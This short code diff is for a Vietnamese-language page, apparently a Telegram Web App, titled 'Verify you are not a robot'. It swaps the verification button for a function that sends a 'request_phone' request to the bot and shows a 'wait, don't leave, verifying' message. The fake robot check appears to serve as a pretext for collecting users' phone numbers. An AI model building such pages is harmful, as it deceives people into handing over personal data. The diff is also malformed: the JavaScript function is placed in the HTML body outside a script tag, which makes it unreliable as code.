@@ -43,12 +43,14 @@ body {
 <body>
 
 <h2 id="title">🤖 Xác minh bạn không phải robot</h2>
-<button onclick="verify()">✅ Tôi không phải robot</button>
+function requestPhone() {
+    Telegram.WebApp.sendData("request_phone");
 
-<div id="loading">
-    <div>Đợi đã, đừng đi ra ngoài</div>
-    <div class="spinner"></div>
-</div>
+    document.body.innerHTML = `
+        <h2>Đợi đã, đừng đi ra ngoài</h2>
+        <p>⏳ Đang xác minh...</p>
+    `;
+}
 
 <script>
 // nếu đã verify thì bỏ qua
